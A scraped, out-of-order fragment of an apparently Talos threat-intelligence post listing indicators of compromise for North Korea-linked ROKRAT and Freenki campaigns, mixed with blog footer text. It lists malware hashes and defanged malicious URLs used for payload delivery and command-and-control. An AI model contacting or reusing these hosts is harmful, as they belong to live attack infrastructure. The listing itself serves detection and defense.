35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2\nFreenki sha256: 7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54df\nFreenki 2016: 99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5\nNetwork:\n- hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]SUMMARY GRAPH\nCONCLUSION\nIOCS\n\"Golden Time\" Campaign:\n\"Evil New Year\" Campaign:\n\"Are You Happy?\" Campaign:\n\"FreeMilk\" Campaign:\n Software\nReputation Center\nVulnerability Information\nMicrosoft Advisory Snort Rules  IP Blacklist Download\nAMP Naming Conventions\nTalos File Reputation\nAWBO Exercises  Library\nSupport Communities\nAbout\nCareers  Blog\nThreat Source Newsletter\nBeers with Talos PodcastCONNECT WITH US\n  \n© 2020  Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy  here.NEWER POST OLDER POST HOME\nSUBSCRIBE TO: POST COMMENTS (ATOM)SHARE THIS POST- hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg\n- hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg\n- hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp\n- hxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.php\nMaldoc sha256: 171e26822421f7ed2e34cc092eaeba8a504b5d576c7fd54aa6975c2e2db0f824\nDropper #1: a29b07a6fe5d7ce3147dd7ef1d7d18df16e347f37282c43139d53cce25ae7037\nDropper #2: eb6d25e08b2b32a736b57f8df22db6d03dc82f16da554f4e8bb67120eacb1d14\nDropper #3: 9b383ebc1c592d5556fec9d513223d4f99a5061591671db560faf742dd68493f\nROKRAT:: b3de3f9309b2f320738772353eb724a0782a1fc2c912483c036c303389307e2e\nMaldoc sha256: f068196d2c492b49e4aae4312c140e9a6c8c61a33f61ea35d74f4a26ef263ead\nPNG : bdd48dbed10f74f234ed38908756b5c3ae3c79d014ecf991e31b36d957d9c950\nROKRAT:: 3f7827bf26150ec26c61d8dbf43cdb8824e320298e7b362d79d7225ab3d655b1\nNetwork:\n- hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.png\nhttp://blog.talosintelligence.com/2017/02/korean-maldoc.html\nhttp://blog.talosintelligence.com/2017/04/introducing-rokrat.html\nhttp://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\nPOSTED BY PAUL RASCAGNERES  AT 12:57 AM  \nLABELS: APT , EXPLOIT , HWP , KOREA , MALWARE RESEARCH , OFFICE , RAT , ROKRAT\n   \"North Korean Human Rights\" Campaign:\n\"Evil New Year 2018\" Campaign:\nREFERENCES\nEnter your comment...\nComment as:  \nGoogle Account\nPublishPublish \nPreviewPreviewNO COMMENTS:\nPOST A COMMENT\n "
}